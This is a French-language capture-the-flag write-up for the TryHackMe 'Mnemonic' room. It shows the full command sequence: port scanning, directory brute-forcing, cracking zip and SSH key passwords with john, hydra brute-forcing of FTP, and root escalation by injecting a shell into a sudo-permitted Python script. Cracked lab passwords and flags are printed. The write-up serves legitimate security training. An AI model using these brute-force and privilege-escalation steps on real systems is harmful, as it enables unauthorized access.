# Mnemonic #

## Task 1 Mnemonic ##

## Task 2 Enumerate ##

```bash
tim@kali:~/Bureau/tryhackme/write-up$ sudo sh -c "echo '10.10.19.36 mnemonic.thm' >> /etc/hosts"
[sudo] Mot de passe de tim : 

tim@kali:~/Bureau/tryhackme/write-up$ sudo nmap -A mnemonic.thm -p-
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-08 19:51 CEST
Nmap scan report for mnemonic.thm (10.10.19.36)
Host is up (0.070s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/webmasters/*
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
1337/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e0:42:c0:a5:7d:42:6f:00:22:f8:c7:54:aa:35:b9:dc (RSA)
|   256 23:eb:a9:9b:45:26:9c:a2:13:ab:c1:ce:07:2b:98:e0 (ECDSA)
|_  256 35:8f:cb:e2:0d:11:2c:0b:63:f2:bc:a0:34:f3:dc:49 (ED25519)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=9/8%OT=21%CT=1%CU=34877%PV=Y%DS=2%DC=T%G=Y%TM=6138F85A
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M506ST11NW6%O2=M506ST11NW6%O3=M506NNT11NW6%O4=M506ST11NW6%O5=M506ST11
OS:NW6%O6=M506ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(
OS:R=Y%DF=Y%T=40%W=F507%O=M506NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 143/tcp)
HOP RTT      ADDRESS
1   33.72 ms 10.9.0.1
2   46.78 ms mnemonic.thm (10.10.19.36)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 72.13 seconds

```

D'arpès nmap on vois 3 services : 
Le service FTP sur le port 21.    
Le service HTTP sur le port 80.    
Le service SSH sur le port 1337.  

**How many open ports?**

D'arpès nmap on a 3 ports.    

**what is the ssh port number?**

On vois que ssh est  sur le port 1337.   

**what is the name of the secret file?** 

```bash
tim@kali:~/Bureau/tryhackme/write-up$ curl http://mnemonic.thm/robots.txt
User-agent: *
Allow: / 
Disallow: /webmasters/*

tim@kali:~/Bureau/tryhackme/write-up$ gobuster dir -u http://mnemonic.thm/webmasters  -w /usr/share/dirb/wordlists/common.txt  -q
/.hta                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/admin                (Status: 301) [Size: 323] [--> http://mnemonic.thm/webmasters/admin/]
/backups              (Status: 301) [Size: 325] [--> http://mnemonic.thm/webmasters/backups/]
/index.html           (Status: 200) [Size: 0]             

tim@kali:~/Bureau/tryhackme/write-up$ gobuster dir -u http://mnemonic.thm/webmasters/backups  -w /usr/share/dirb/wordlists/common.txt  -x txt,zip,jpg -q 
/.hta                 (Status: 403) [Size: 277]
/.hta.txt             (Status: 403) [Size: 277]
/.hta.zip             (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.hta.jpg             (Status: 403) [Size: 277]
/.htpasswd.txt        (Status: 403) [Size: 277]
/.htaccess.txt        (Status: 403) [Size: 277]
/.htpasswd.zip        (Status: 403) [Size: 277]
/.htaccess.zip        (Status: 403) [Size: 277]
/.htpasswd.jpg        (Status: 403) [Size: 277]
/.htaccess.jpg        (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/backups.zip          (Status: 200) [Size: 409]
/index.html           (Status: 200) [Size: 0]  

```

Dans le fichier robots.txt à la racine site on voit un répertoire webmaster. 
Puis avec gobuster on trouve le fichier backups.zip.    

La réponse est : backups.zip   

## Task 3 Credentials ##

**ftp user name?**

```bash
tim@kali:~/Bureau/tryhackme/write-up$ wget http://mnemonic.thm/webmasters/backups/backups.zip -nv
2021-09-08 20:21:26 URL:http://mnemonic.thm/webmasters/backups/backups.zip [409/409] -> "backups.zip" [1]

tim@kali:~/Bureau/tryhackme/write-up$ zip2john backups.zip > hash
backups.zip/backups/ is not encrypted!
ver 1.0 backups.zip/backups/ is not encrypted, or stored with non-handled compression type
ver 2.0 efh 5455 efh 7875 backups.zip/backups/note.txt PKZIP Encr: 2b chk, TS_chk, cmplen=67, decmplen=60, crc=AEE718A8

tim@kali:~/Bureau/tryhackme/write-up$ john hash -w=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
00385007         (backups.zip/backups/note.txt)
1g 0:00:00:05 DONE (2021-09-08 20:24) 0.1748g/s 2494Kp/s 2494Kc/s 2494KC/s 0050cent..0012093760
Use the "--show" option to display all of the cracked passwords reliably
Session completed

tim@kali:~/Bureau/tryhackme/write-up$ unzip backups.zip 
Archive:  backups.zip
[backups.zip] backups/note.txt password: 
  inflating: backups/note.txt        

tim@kali:~/Bureau/tryhackme/write-up$ cat ./backups/note.txt 
@vill

James new ftp username: ftpuser
we have to work hard
```

On télécharge le fichier backups.zip    
On brute force le mot de passe de backups.zip avec john the ripper et on trouve le mot de passe : 00385007   
On extrait le fichier note.txt de backups.zip.   
Dans le fichier note on trouve le nom d'utilisateur pour se connecter sur le FTP.    

La réponse est : ftpuser     

**ftp password?**

```bash
tim@kali:~/Bureau/tryhackme/write-up$ hydra -l ftpuser -P /usr/share/wordlists/rockyou.txt ftp://mnemonic.thm
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-09-08 20:32:28
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://mnemonic.thm:21/
[STATUS] 272.00 tries/min, 272 tries in 00:01h, 14344127 to do in 878:56h, 16 active
[STATUS] 268.00 tries/min, 804 tries in 00:03h, 14343595 to do in 892:01h, 16 active
[21][ftp] host: mnemonic.thm   login: ftpuser   password: love4ever
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-09-08 20:36:33
```

Avec hydra on force brute le mot de passe FTP et on trouve le mot de passe qui est : love4ever  

**What is the ssh username?** 

```bash
ftp> cd data-4
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jul 14  2020 3
drwxr-xr-x    2 0        0            4096 Jul 14  2020 4
-rwxr-xr-x    1 1001     1001         1766 Jul 13  2020 id_rsa
-rwxr-xr-x    1 1000     1000           31 Jul 13  2020 not.txt
226 Directory send OK.
ftp> mget *
mget 3? n
mget 4? n
mget id_rsa? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for id_rsa (1766 bytes).
226 Transfer complete.
1766 bytes received in 0.09 secs (19.1764 kB/s)
mget not.txt? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for not.txt (31 bytes).
226 Transfer complete.
31 bytes received in 0.00 secs (96.4122 kB/s)

tim@kali:~/Bureau/tryhackme/write-up$ cat not.txt 
james change ftp user password
```

Dans le serveur ftp on trouve un fichier not.txt qui contient le d'utilisateur qui est james.    

**What is the ssh password?**

```bash
tim@kali:~/Bureau/tryhackme/write-up$ python3 /usr/share/john/ssh2john.py id_rsa > hash
/usr/share/john/ssh2john.py:103: DeprecationWarning: decodestring() is a deprecated alias since Python 3.1, use decodebytes()
  data = base64.decodestring(data)

tim@kali:~/Bureau/tryhackme/write-up$ john hash -w=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
bluelove         (id_rsa)
```

On casse le mot de passe avec john et on trouve le mot de passe qui est : bluelove  

**What is the condor password?**

```bash
tim@kali:~/Bureau/tryhackme/write-up$ ssh james@mnemonic.thm -p 1337
The authenticity of host '[mnemonic.thm]:1337 ([10.10.19.36]:1337)' can't be established.
ECDSA key fingerprint is SHA256:nwJynJn7/m7+VP5h40EAKHef3qSEfKTIZsdI8GH+LgI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[mnemonic.thm]:1337,[10.10.19.36]:1337' (ECDSA) to the list of known hosts.
james@mnemonic.thm's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-111-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Sep  8 19:28:06 UTC 2021

  System load:  0.0                Processes:           94
  Usage of /:   34.1% of 12.01GB   Users logged in:     0
  Memory usage: 34%                IP address for eth0: 10.10.19.36
  Swap usage:   0%

  => There is 1 zombie process.


51 packages can be updated.
0 updates are security updates.


Last login: Thu Jul 23 20:40:09 2020 from 192.168.1.5
                                                                               
Broadcast message from root@mnemonic (somewhere) (Wed Sep  8 19:28:11 2021):   
                                                                               
     IPS/IDS SYSTEM ON !!!!                                                    
 **     *     ****  **                                                         
         * **      *  * *                                                      
*   ****                 **                                                    
 *                                                                             
    * *            *                                                           
       *                  *                                                    
         *               *                                                     
        *   *       **                                                         
* *        *            *                                                      
              ****    *                                                        
     *        ****                                                             
                                                                               
 Unauthorized access was detected.                                             
                                                                               

6450.txt  noteforjames.txt
james@mnemonic:~$ cat 6450.txt
5140656
354528
842004
1617534
465318
1617534
509634
1152216
753372
265896
265896
15355494
24617538
3567438
15355494

james@mnemonic:~$ cat noteforjames.txt
noteforjames.txt
@vill
james i found a new encryption İmage based name is Mnemonic  
I created the condor password. don't forget the beers on saturday

```

On a deux fichier le premier fichier est une liste de nombre qui va nous servir plus tard.  

```bash
james@mnemonic:~$ find / -name user.txt 2>&1 | grep home
find: ‘/home/jeff’: Permission denied
find: ‘/home/mike’: Permission denied
find: ‘/home/ftpuser’: Permission denied
find: ‘/home/condor/'VEhNe2E1ZjgyYTAwZTJmZWVlMzQ2NTI0OWI4NTViZTcxYzAxfQ=='’: Permission denied
find: ‘/home/condor/.gnupg’: Permission denied
find: ‘/home/condor/.cache’: Permission denied
find: ‘/home/condor/aHR0cHM6Ly9pLnl0aW1nLmNvbS92aS9LLTk2Sm1DMkFrRS9tYXhyZXNkZWZhdWx0LmpwZw==’: Permission denied
find: ‘/home/john’: Permission denied
find: ‘/home/alex’: Permission denied
find: ‘/home/vill’: Permission denied
```

On trouve 2 répertoires codés en base64.   

```
tim@kali:~/Bureau/tryhackme/write-up$ echo "aHR0cHM6Ly9pLnl0aW1nLmNvbS92aS9LLTk2Sm1DMkFrRS9tYXhyZXNkZWZhdWx0LmpwZw==" | base64 -d
https://i.ytimg.com/vi/K-96JmC2AkE/maxresdefault.jpg

tim@kali:~/Bureau/tryhackme/write-up$ echo "VEhNe2E1ZjgyYTAwZTJmZWVlMzQ2NTI0OWI4NTViZTcxYzAxfQ==" | base64 -d
THM{a5f82a00e2feee3465249b855be71c01} 
```

On trouve un lien qui pointe vers une image.  
Et trouve un flag qui est le flag user.     

```bash
tim@kali:~/Bureau/tryhackme/write-up$ wget https://i.ytimg.com/vi/K-96JmC2AkE/maxresdefault.jpg -nv
2021-09-08 22:25:14 URL:https://i.ytimg.com/vi/K-96JmC2AkE/maxresdefault.jpg [154514/154514] -> "maxresdefault.jpg" [1]
```

On télécharge l'image.
Dans un message précédent on nous parle d'un chiffrement du nom de mnemonic.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ git clone https://github.com/MustafaTanguner/Mnemonic
Clonage dans 'Mnemonic'...
remote: Enumerating objects: 193, done.
remote: Counting objects: 100% (52/52), done.
remote: Compressing objects: 100% (51/51), done.
remote: Total 193 (delta 20), reused 0 (delta 0), pack-reused 141
Réception d'objets: 100% (193/193), 6.78 Mio | 19.72 Mio/s, fait.
Résolution des deltas: 100% (88/88), fait.

tim@kali:~/Bureau/tryhackme/write-up$ scp -P 1337 james@mnemonic.thm:~/6450.txt ./ 
james@mnemonic.thm's password: 
6450.txt                                                                                                                                                                                                    100%  116     3.4KB/s   00:00    
tim@kali:~/Bureau/tryhackme/write-up$ 


tim@kali:~/Bureau/tryhackme/write-up$ cd Mnemonic/

tim@kali:~/Bureau/tryhackme/write-up/Mnemonic$ python Mnemonic.py 


ooo        ooooo                                                                o8o            
`88.       .888'                                                                `"'            
 888b     d'888  ooo. .oo.    .ooooo.  ooo. .oo.  .oo.    .ooooo.  ooo. .oo.   oooo   .ooooo.  
 8 Y88. .P  888  `888P"Y88b  d88' `88b `888P"Y88bP"Y88b  d88' `88b `888P"Y88b  `888  d88' `"Y8 
 8  `888'   888   888   888  888ooo888  888   888   888  888   888  888   888   888  888       
 8    Y     888   888   888  888    .o  888   888   888  888   888  888   888   888  888   .o8 
o8o        o888o o888o o888o `Y8bod8P' o888o o888o o888o `Y8bod8P' o888o o888o o888o `Y8bod8P' 


******************************* Welcome to Mnemonic Encryption Software *********************************
*********************************************************************************************************
***************************************** Author:@villwocki *********************************************
*********************************************************************************************************
****************************** https://www.youtube.com/watch?v=pBSR3DyobIY ******************************
---------------------------------------------------------------------------------------------------------


Access Code image file Path:../maxresdefault.jpg
File exists and is readable


Processing:0.txt'dir.


*************** PROCESS COMPLETED ***************
Image Analysis Completed Successfully. Your Special Code:
[18040524736954552171240290634275910766959300482314707502901100419741398548965224725941021802487032836173634780850941582665145982921504858872321671604862829564607684810526492066226402684287616853873210669999061793585789130700435803828790107520566469792840943480312282503452757516106152078159427180240005535346255332508553204437788143156338915508366294152127113927707875461041975995380102488277249004978168150375226943402813101473129934947391047550289946960484563830077512150922589946415843574688787885125530961139010129215262707445950279859171570703824082806870131361331767370463043186684480807380022655925970022578263260441484625103975073440016327873803686977341928854134976378773600501106381048323122645504600352672462576003715628729391078556691378514984869667325662681952842565476861053690293969966782880123327168780763438531971993188949492933279982487685918120778097782850287929842115690724987096321703212163060333224283284977289802827842879042839640262338746553035294867669059625954075656244962808053213786680390708256762450366138601087542331279508299395275052543712662356328041378219046371806187926898951884853219678957425819999274422457001222309298609639251426093640939141057849874336447995977756479546186718050005298641912474325522605377986224192640694882228380343957998739955025989717286813486502685888047917180755315870714390211946645377824808166849789179435231274421467146198503514028811829300781004919877657049378435667265681319881668251241048231624460484807297038652817741869560603973762676697915583148823703700356493329862580202524500957554509421887074199100294146498732117768932143672904961738653833526638191846440214708821866139175026618637297264825003345892737942605429893574715451387924833678705133789951929605852462681960477345012953624020311976391557709788081555805657631766992810607938136910032486660007651564422670123805991173718718054421178052348944476392816000024581612574082946930065731550351831453219624684151953579510511728103358957331905212408878550039564212574718137567251206027830512330028065065453978937864280959609862513771190784012965669450685145037267642052364077110425690327182134221410979503542884860706732849934129978585114218727611818535870279929449601149898359095286920635366467549708130906749543661896923083187366061909026289661930922600092201579516609661082432775711870335549545629510027691594227860730612243143186998690675558933362090484506118561221209707766409716340182306372820967200382582924543624088571734200353648616261606529316446377770014092636693341125452946580955407629142994557330066002481203213159235316398381340305331731160166517666856882223390348124513308977825051988793237597836987360929298623246303189249691856582689010276308942286830178274172390838724707574971941901952561981824488910046853278229420504365442198918541710225781407434471906744193785133373312799582855296856950856709835659758219138879225768326613692361174053301275224320175854389113874050923227343996320199043477174610191600388011901437299832085638741402321326712525403656134611009999653962145807100825283090403287783417942602115287432675425286401345041435462570643325863310648377212678849664669288738489546673696702139852781071024689212032925750241891326917244780892553526540693621507023878116197492063762724742734661528704061416514721525046633306388371457285426394045190956663884196393567921829300941889216301986124323562132630534219703037020584372302571474382440496441398574114480957204383033321943262503608350362011371242523468860301325689572145533367049207144001883042555930629828285092657187665911761012561666252765177388099698738547128081854538124632051019468014403510598252793989911273187304833487586015420746231436325474874148965434852180676060928100023644313812181795987232910338830331055834729510404938346846471989919015845599795735768790939643391619284305838250318876707485538128176905275930727621806314457956616994759990987819253690544858857585770580235516943059089670589008382216490392151650577917337444115061483517261902983890208304334109451908984031069448924459901518438359206228316357104747954666210709949514348792360318304939151977453561590231001285752786268039570819276963721730449210149230489645405656043361846832132327771993274964709698856004767446608538370095610585587983434524982269314296208590747643797536711604753777854347516951660314747499033416983591953318141292543620399914295001181141940259724324791049457851810362242220088435283906340004174699977928565275154490289396718044511845918775172725752454755679603428250332482282444608418419550363532603974145871838290800304446059866660551988834512932996464464096290454885378463244188011655534860313546313761759397376280991585278591022593760639416075100122750488675696958867052601661035394259353669506253871127432058487776848139996130655605672187446682975840302306598400089474008139886454382608332744746601204596315835032610624779552707307670309573035414379272605351453371872703122153274147603344093748070074860459646082074018819696125737477688740729695352743137967464691424821248000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000]


(1) ENCRYPT (2) DECRYPT

>>>>2
ENCRYPT Message to file Path'

Please enter the file Path:../6450.txt
 
 
 
pasificbell1981
```

On télécharge Mnemonic , le programme qui déchiffre l'image.   
On récupère la clef qui est dans le fichier 6450.txt.  
On décode les informations de l'image.  

On trouve le mot de passe de condor qui est : pasificbell1981  

## Task 4 Hack the machine ##

**user.txt**

On a déjà la réponse.

La réponse est : THM{a5f82a00e2feee3465249b855be71c01}   

**root.txt**    

```bash
condor@mnemonic:~$ sudo -l
[sudo] password for condor: 
Matching Defaults entries for condor on mnemonic:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User condor may run the following commands on mnemonic:
    (ALL : ALL) /usr/bin/python3 /bin/examplecode.py


condor@mnemonic:~$ ls -al /bin/examplecode.py
-rw-r--r-- 1 root root 2352 Jul 15  2020 /bin/examplecode.py
```

Dans le configuration sudo on peut exécuter examplecode.py avec les droits root.   
On remarque que l'on peut pas modifier le fichier.     

```python
condor@mnemonic:~$ cat /bin/examplecode.py 
#!/usr/bin/python3
import os
import time
import sys
def text(): #text print 


	print("""

	------------information systems script beta--------
	---------------------------------------------------
	---------------------------------------------------
	---------------------------------------------------
	---------------------------------------------------
	---------------------------------------------------
	---------------------------------------------------
	----------------@author villwocki------------------""")
	time.sleep(2)
	print("\nRunning...")
	time.sleep(2)
	os.system(command="clear")
	main()


def main():
	info()
	while True:
		select = int(input("\nSelect:"))

		if select == 1:
			time.sleep(1)
			print("\nRunning")
			time.sleep(1)
			x = os.system(command="ip a")
			print("Main Menü press '0' ")
			print(x)

		if select == 2:
			time.sleep(1)
			print("\nRunning")
			time.sleep(1)
			x = os.system(command="ifconfig")
			print(x)

		if select == 3:
			time.sleep(1)
			print("\nRunning")
			time.sleep(1)
			x = os.system(command="ip route show")
			print(x)

		if select == 4:
			time.sleep(1)
			print("\nRunning")
			time.sleep(1)
			x = os.system(command="cat /etc/os-release")
			print(x)

		if select == 0: 
			time.sleep(1)
			ex = str(input("are you sure you want to quit ? yes : "))
		
			if ex == ".":
				print(os.system(input("\nRunning....")))
			if ex == "yes " or "y":
				sys.exit()
                      

		if select == 5:                     #root
			time.sleep(1)
			print("\nRunning")
			time.sleep(2)
			print(".......")
			time.sleep(2)
			print("System rebooting....")
			time.sleep(2)
			x = os.system(command="shutdown now")
			print(x)

		if select == 6:
			time.sleep(1)
			print("\nRunning")
			time.sleep(1)
			x = os.system(command="date")
			print(x)




		if select == 7:
			time.sleep(1)
			print("\nRunning")
			time.sleep(1)
			x = os.system(command="rm -r /tmp/*")
			print(x)

                      
              


       


            

def info():                         #info print function
	print("""

	#Network Connections   [1]

	#Show İfconfig         [2]

	#Show ip route         [3]

	#Show Os-release       [4]

        #Root Shell Spawn      [5]           

        #Print date            [6]

	#Exit                  [0]

	""")

def run(): # run function 
	text()

run()


```

On regarde le code source.   

```python
	if select == 0: 
			time.sleep(1)
			ex = str(input("are you sure you want to quit ? yes : "))
		
			if ex == ".":
				print(os.system(input("\nRunning....")))
			if ex == "yes " or "y":
				sys.exit()
```

On remarque que si on prend l'option zero que l'on qui avec \. le programme va attendre que on lui entre une commande puis va l'exécuter.    

```bash
condor@mnemonic:~$ sudo /usr/bin/python3 /bin/examplecode.py


	------------information systems script beta--------
	---------------------------------------------------
	---------------------------------------------------
	---------------------------------------------------
	---------------------------------------------------
	---------------------------------------------------
	---------------------------------------------------
	----------------@author villwocki------------------

Running...



	#Network Connections   [1]

	#Show İfconfig         [2]

	#Show ip route         [3]

	#Show Os-release       [4]

        #Root Shell Spawn      [5]           

        #Print date            [6]

	#Exit                  [0]

	

Select:0
are you sure you want to quit ? yes : .

Running....sh
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
THM{congratulationsyoumadeithashme}
```

On exécute le programme avec sudo, on quitte le programme et on lui fait exécuter un shell.    
On obtient un shell root.   
On lit le fichier root.txt qui contient le flag.    

La réponse est : THM{congratulationsyoumadeithashme}   